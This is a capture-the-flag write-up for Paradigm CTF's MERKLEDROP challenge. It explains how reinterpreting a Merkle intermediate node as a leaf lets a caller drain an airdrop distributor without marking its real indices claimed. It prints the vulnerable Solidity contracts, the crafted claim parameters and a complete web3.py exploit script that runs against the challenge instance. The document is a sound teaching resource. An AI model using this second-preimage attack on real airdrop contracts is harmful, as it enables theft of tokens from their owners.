# MERKLEDROP (190.9 points, pwn)

Solved by: Kaiziron

Team: D53_H473r5 

### Description :
```
DESCRIPTION
Were you whitelisted?

ACCESS
nc 35.188.148.32 31337

RESOURCES
https://github.com/paradigmxyz/paradigm-ctf-infrastructure
/resources/merkledrop.zip
```

This challenge is about airdrop whitelisting using merkle tree. Normally if we submit leaf and valid proof, it will send the airdrop token to the address of the leaf and set  the index as claimed.

To solve this challenge, we have to drain all airdrop tokens from the MerkleDistributer, and `isClaimed()` has to return `false` for at least one index.

### Setup contract :
```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.16;

import "./MerkleDistributor.sol";

contract Token is ERC20Like {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 1_000_000 ether;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }

    function approve(address to, uint256 amount) public returns (bool) {
        allowance[msg.sender][to] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        return transferFrom(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        if (from != msg.sender) {
            allowance[from][to] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Setup {

    Token public immutable token;
    MerkleDistributor public immutable merkleDistributor;

    constructor() payable {
        token = new Token();
        uint256 airdropAmount = 75000 * 10 ** 18;
        merkleDistributor = new MerkleDistributor(
            address(token), 
            bytes32(0x5176d84267cd453dad23d8f698d704fc7b7ee6283b5131cb3de77e58eb9c3ec3)
        );
        token.transfer(address(merkleDistributor), airdropAmount);
    }

    function isSolved() public view returns (bool) {
        bool condition1 = token.balanceOf(address(merkleDistributor)) == 0;
        bool condition2 = false;
        for (uint256 i = 0; i < 64; ++i) {
            if (!merkleDistributor.isClaimed(i)) {
                condition2 = true;
                break;
            }
        }
        return condition1 && condition2;
    }
}
```

The setup contract will first deploy a token contract for the airdrop, then deploy a MerkleDistributer contract and setting the merkle root. Finally, send `75000 * 10 ** 18` amount of airdrop token to it.


### MerkleDistributer contact : 

```solidity 
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.16;

import "./MerkleProof.sol";

interface ERC20Like {
    function transfer(address dst, uint qty) external returns (bool);
}

contract MerkleDistributor {

    event Claimed(uint256 index, address account, uint256 amount);

    address public immutable token;
    bytes32 public immutable merkleRoot;

    // This is a packed array of booleans.
    mapping(uint256 => uint256) private claimedBitMap;

    constructor(address token_, bytes32 merkleRoot_) {
        token = token_;
        merkleRoot = merkleRoot_;
    }

    function isClaimed(uint256 index) public view returns (bool) {
        uint256 claimedWordIndex = index / 256;
        uint256 claimedBitIndex = index % 256;
        uint256 claimedWord = claimedBitMap[claimedWordIndex];
        uint256 mask = (1 << claimedBitIndex);
        return claimedWord & mask == mask;
    }

    function _setClaimed(uint256 index) private {
        uint256 claimedWordIndex = index / 256;
        uint256 claimedBitIndex = index % 256;
        claimedBitMap[claimedWordIndex] = claimedBitMap[claimedWordIndex] | (1 << claimedBitIndex);
    }

    function claim(uint256 index, address account, uint96 amount, bytes32[] memory merkleProof) external {
        require(!isClaimed(index), 'MerkleDistributor: Drop already claimed.');

        // Verify the merkle proof.
        bytes32 node = keccak256(abi.encodePacked(index, account, amount));
        require(MerkleProof.verify(merkleProof, merkleRoot, node), 'MerkleDistributor: Invalid proof.');

        // Mark it claimed and send the token.
        _setClaimed(index);
        require(ERC20Like(token).transfer(account, amount), 'MerkleDistributor: Transfer failed.');

        emit Claimed(index, account, amount);
    }
}
```

### MerkleProof contract :
```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.16;

/**
 * @title MerkleProof
 * @dev Merkle proof verification based on
 * https://github.com/ameensol/merkle-tree-solidity/blob/master/src/MerkleProof.sol
 */
library MerkleProof {
  /**
   * @dev Verifies a Merkle proof proving the existence of a leaf in a Merkle tree. Assumes that each pair of leaves
   * and each pair of pre-images are sorted.
   * @param proof Merkle proof containing sibling hashes on the branch from the leaf to the root of the Merkle tree
   * @param root Merkle root
   * @param leaf Leaf of Merkle tree
   */
  function verify(
    bytes32[] memory proof,
    bytes32 root,
    bytes32 leaf
  )
    internal
    pure
    returns (bool)
  {
    bytes32 computedHash = leaf;

    for (uint256 i = 0; i < proof.length; i++) {
      bytes32 proofElement = proof[i];

      if (computedHash < proofElement) {
        // Hash(current computed hash + current element of the proof)
        computedHash = keccak256(abi.encodePacked(computedHash, proofElement));
      } else {
        // Hash(current element of the proof + current computed hash)
        computedHash = keccak256(abi.encodePacked(proofElement, computedHash));
      }
    }

    // Check if the computed hash (root) is equal to the provided root
    return computedHash == root;
  }
}
```

### Explaining what the contract does : 

For MerkleDistributer, apart from the view function, the only external function is `claim(uint256 index, address account, uint96 amount, bytes32[] memory merkleProof)`

This function allow whitelisted address to claim their airdrop tokens and set the corresponding bit of the uint in `claimedBitMap[0]` into claimed (1), so they won't be able to claim more than they should.

As there is only 64 leaves, normally it will never use elements apart from the first element in the `claimedBitMap` array.

Then it use `abi.encodePacked` to pack the submitted index, account and amount and get the keccak256 hash of it as the hash of the leaf, and verify it with the MerkleProof library

Then just set it to be claimed and transfer tokens to the whitelisted address.

However, it does not have any access control, so everyone having the index, account, amount and merkle proof will be able to call `claim()` and drain tokens from the MerkleDistributer. But this won't be a security concern, as it will send tokens to the whitelisted address of the leaf, not the caller. 

All information about the every leaf such as index, address and merkle proof was given in `tree.json` :

```json
cat tree.json 
{
    "merkleRoot": "0x5176d84267cd453dad23d8f698d704fc7b7ee6283b5131cb3de77e58eb9c3ec3",
    "tokenTotal": "0x0fe1c215e8f838e00000",
    "claims": {
        "0x00E21E550021Af51258060A0E18148e36607C9df": {
            "index": 0,
            "amount": "0x09906894166afcc878",
            "proof": [
                "0xa37b8b0377c63d3582581c28a09c10284a03a6c4185dfa5c29e20dbce1a1427a",
                "0x0ae01ec0f7a50774e0c1ad35f0f5efcc14c376f675704a6212b483bfbf742a69",
                "0x3f267b524a6acda73b1d3e54777f40b188c66a14a090cd142a7ec48b13422298",
                "0xe2eae0dabf8d82b313729f55298625b7ac9ba0f12e408529bae4a2ce405e7d5f",
                "0x01cf774c22de70195c31bde82dc3ec94807e4e4e01a42aca6d5adccafe09510e",
                "0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5"
            ]
        },
        "0x046887213a87DC19e843E6E3e47Fc3243A129ad0": {
            "index": 1,
            "amount": "0x41563bf77450fa5076",
            "proof": [
                "0xbadd8fe5b50451d4c1157443afb33e60369d0949d65fc61d06fca35576f68caa",
                "0xb74970b484c464c0e6872c78a4fec81a5166f500c6e128052ca5db7a7e22d858",
                "0xf5f6b74e51a15573007b59fb217c22c55fd9748a1e70578c6ddaf550b7298882",
                "0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813",
                "0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c",
                "0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5"
            ]
        },
        "0x04E9df03e12F21bFB77a97e4306Ef4daeb4129c2": {
            "index": 2,
            "amount": "0x36df43795a7caf4540",
            "proof": [
                "0x30976e6e39aeda0af50595309cfe319061ee99610d640a3ff2d490653963d22a",
                "0xc8a963490279786bf4d9522dad319dd536d7de4764d2fc6564356ff73b49cf16",
                "0x955c47a5eea3ebf139056c0603d096a40a686b2304506f7509859fe9cc19bd79",
                "0x21daac29f18f235ede61e08c609f5762e5d12f87d9f014a3254039eb7b71d931",
                "0x4fcfc1702cc3495bc600779c15a4aec4dc5f6432cbf82d5209c0f07095ffe33c",
                "0x3d159ff1e06840b9a541438da880d6637874661722c48e37343c9e6329245c2e"
            ]
        },
...
```

So everyone can just submit those data and drain all tokens away from MerkleDistributer.

But draining all tokens from MerkleDistributer won't solve this challenge, as claiming all tokens in a normal way, will set all index of the leaf to be claimed, which `isClaimed()` has to be false in at least one index of index 0-63 to pass `condition2`.

### How we can drain all tokens away while leaving at least one index for isClaimed() to return false : 

There is a way to drain tokens away without letting `isClaimed()` return true on index 0-63.

However this way is likely not going to happen in the real world, but as this is a CTF challenge, the merkle proof and amount are carefully created to make this possible.

This line is to get the leaf hash form index, account and amount by packing them using `abi.encodePacked()` and getting the keccak256 hash :

```solidity
bytes32 node = keccak256(abi.encodePacked(index, account, amount));
```

What `abi.encodePacked()` will do is padding the data of the variable with zeros depending on the data type size, then concentanate the packed data of those 3 variables.

`index` is uint256 (256 bit), `account` is address (160 bit) and `amount` is uint96 (96 bit), so the total size after its packed will be 512 bit.

For the merkle proof, each proof is a hash of bytes32 (256 bit), and when calculating the merkle root, 2 proofs will be packed with `abi.encodePacked()` and getting keccak256 hash of it, which is excatly same as getting the hash for the leaf. When 2 proofs are packed, it's excatly 512 bit just like the packed index, account and amount. 

So it is possible to split up a 2 concatenated valid proofs to submit as index, address and amount to verify with `claim()`.

In the 512 bit of data of 2 concatenated valid proofs, first 256 bit will be the uint256 `index`, and then 160 bit after it will be the address `account`, and last 96 bit will be the uint96 `amount`.

So there is a problem, the total amount is `0x0fe1c215e8f838e00000` and if we drain more than that, there will be interger underflow and the transaction will be reverted.

```json
{
    "merkleRoot": "0x5176d84267cd453dad23d8f698d704fc7b7ee6283b5131cb3de77e58eb9c3ec3",
    "tokenTotal": "0x0fe1c215e8f838e00000",
    "claims": {
        "0x00E21E550021Af51258060A0E18148e36607C9df": {
            "index": 0,
            "amount": "0x09906894166afcc878",
            "proof": [
                "0xa37b8b0377c63d3582581c28a09c10284a03a6c4185dfa5c29e20dbce1a1427a",
                "0x0ae01ec0f7a50774e0c1ad35f0f5efcc14c376f675704a6212b483bfbf742a69",
                "0x3f267b524a6acda73b1d3e54777f40b188c66a14a090cd142a7ec48b13422298",
                "0xe2eae0dabf8d82b313729f55298625b7ac9ba0f12e408529bae4a2ce405e7d5f",
                "0x01cf774c22de70195c31bde82dc3ec94807e4e4e01a42aca6d5adccafe09510e",
                "0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5"
            ]
        },
...
```


If I randomly pick 2 merkle proof, for example : `0xa37b8b0377c63d3582581c28a09c10284a03a6c4185dfa5c29e20dbce1a1427a` and `0x0ae01ec0f7a50774e0c1ad35f0f5efcc14c376f675704a6212b483bfbf742a69`, after 2 proofs are concatenated, the last 96 bits will be the last 96 bits of the 2nd proof which is `0x75704a6212b483bfbf742a69` that is much larger than `0x0fe1c215e8f838e00000`. Therefore we have to find a proof hash that the last 96 bits is starting with zeros.

As this is a CTF challenge, its carefully created to have the proof needed in index 37 :
```solidity
        "0x8a85e6D0d2d6b8cBCb27E724F14A97AeB7cC1f5e": {
            "index": 37,
            "amount": "0x5dacf28c4e17721edb",
            "proof": [
                "0xd48451c19959e2d9bd4e620fbe88aa5f6f7ea72a00000f40f0c122ae08d2207b",
                "0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d",
                "0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde",
                "0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813",
                "0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c",
                "0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5"
            ]
        },
```

This is the proof we need : `0xd48451c19959e2d9bd4e620fbe88aa5f6f7ea72a00000f40f0c122ae08d2207b`, and the last 96 bit is `0x00000f40f0c122ae08d2207b` which is smaller than the total token amount : `0x0fe1c215e8f838e00000`.

So, we will just get the hash of index 37 by packing the `index` (0x25), `address` (0x8a85e6D0d2d6b8cBCb27E724F14A97AeB7cC1f5e) and `amount` (0x5dacf28c4e17721edb) with `abi.encodePacked()` and then getting the keccak256 hash with a smart contract, or we can also do it in python with web3.py and manually do the padding :

```python
>>> Web3.keccak(hexstr='00000000000000000000000000000000000000000000000000000000000000258a85e6D0d2d6b8cBCb27E724F14A97AeB7cC1f5e0000005dacf28c4e17721edb')
HexBytes('0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442')
```

Then we will concatenate the hash for index 37 with the proof above :  `0xd48451c19959e2d9bd4e620fbe88aa5f6f7ea72a00000f40f0c122ae08d2207b`.

Finally, split it up the whole thing to `index`, `address` and `amount` and call `claim()` with it and the remaining merkle proofs : `claim(0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442, "0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A", 0x00000f40f0c122ae08d2207b, ["0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d","0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde","0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813","0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c","0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5"])`

Then tokens of `0x00000f40f0c122ae08d2207b` amount will be drained away from MerkleDistributer, and only a small amount remains : 
```python
>>> hex(0x0fe1c215e8f838e00000 - 0x00000f40f0c122ae08d2207b)
'0xa0d154c64a300ddf85'
```

Again, it's a CTF challenge, "luckily" theres a whitelisted address having the same excat amount : 
```solidity
        "0x249934e4C5b838F920883a9f3ceC255C0aB3f827": {
            "index": 8,
            "amount": "0xa0d154c64a300ddf85",
            "proof": [
                "0xe10102068cab128ad732ed1a8f53922f78f0acdca6aa82a072e02a77d343be00",
                "0xd779d1890bba630ee282997e511c09575fae6af79d88ae89a7a850a3eb2876b3",
                "0x46b46a28fab615ab202ace89e215576e28ed0ee55f5f6b5e36d7ce9b0d1feda2",
                "0xabde46c0e277501c050793f072f0759904f6b2b8e94023efb7fc9112f366374a",
                "0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c",
                "0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5"
            ]
        },
```

Just call `claim()` with data from index 8, and the all tokens in MerkleDistributer will be completely drained away, and only one of the whitelisted address will be set to claimed, other all remains not claimed, so both `condition1` and `condition2` is archieved.

### Exploit script :

```python
from web3 import Web3, HTTPProvider
import rlp
from eth_account import Account
import json

web3 = Web3(HTTPProvider('http://35.188.148.32:8545/1aa28e71-53ed-467e-8c37-61edde7521ec'))

print(f'Block number : {web3.eth.get_block("latest").number}')

# setup contract address
setup_address = "0xc21f2DB2219f34C12306d1e932f7450613a26F1d"
nonce = 1
token_address = Web3.toChecksumAddress(Web3.keccak(rlp.encode([int(setup_address, 16), nonce]))[12:].hex())
print(f'Token contract address : {token_address}')

nonce = 2
distributer_address = Web3.toChecksumAddress(Web3.keccak(rlp.encode([int(setup_address, 16), nonce]))[12:].hex())
print(f'MerkleDistributer contract address : {distributer_address}')


# private key the instance give us
private_key = "0x7d386cde8f3eaae38e0cd7b73a552ffc8d27f1420fcabf1d26271de41c60d157"
acct = Account.from_key(private_key)
wallet = acct.address

balance = web3.fromWei(web3.eth.getBalance(wallet), 'ether')
print(f'Wallet : {wallet}')
print(f'Balance (ETH) : {balance}')



distributer_abi = '[{"inputs":[{"internalType":"address","name":"token_","type":"address"},{"internalType":"bytes32","name":"merkleRoot_","type":"bytes32"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"index","type":"uint256"},{"indexed":false,"internalType":"address","name":"account","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Claimed","type":"event"},{"inputs":[{"internalType":"uint256","name":"index","type":"uint256"},{"internalType":"address","name":"account","type":"address"},{"internalType":"uint96","name":"amount","type":"uint96"},{"internalType":"bytes32[]","name":"merkleProof","type":"bytes32[]"}],"name":"claim","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"index","type":"uint256"}],"name":"isClaimed","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"merkleRoot","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"token","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]'
distributer_instance = web3.eth.contract(address=distributer_address, abi=distributer_abi)



def claim(index, account, amount, merkleProof):
	nonce = web3.eth.getTransactionCount(wallet)
	gasPrice = web3.toWei('4', 'gwei')
	gasLimit = 1000000
	tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
	}
	transaction = distributer_instance.functions.claim(index, account, amount, merkleProof).buildTransaction(tx)
	signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
	tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
	transaction_hash = web3.toHex(tx_hash)
	tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)

	print(tx_receipt['status'])
	print(transaction_hash)

# Drain token without letting it set isClaimed() to true
claim(0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442, "0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A", 0x00000f40f0c122ae08d2207b, ["0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d","0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde","0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813","0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c","0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5"])


f = open('public/tree.json', 'r').read()
tree = json.loads(f)

# Drain excat remaining token to not underflow it and excatly drain it to 0
addr = "0x249934e4C5b838F920883a9f3ceC255C0aB3f827"
index = tree["claims"][addr]["index"]
amount = int(tree["claims"][addr]["amount"], 16)
proof = tree["claims"][addr]["proof"]
claim(index, addr, amount, proof)


# Check merkle tree
print('Check isClaimed(), loop through all leaves')
for i in range(64):
	res = distributer_instance.functions.isClaimed(i).call()
	print(str(res))



```

### Flag :
```
nc 35.188.148.32 31337
1 - launch new instance
2 - kill instance
3 - get flag
action? 3

PCTF{N1C3_Pr00F_8r0}
```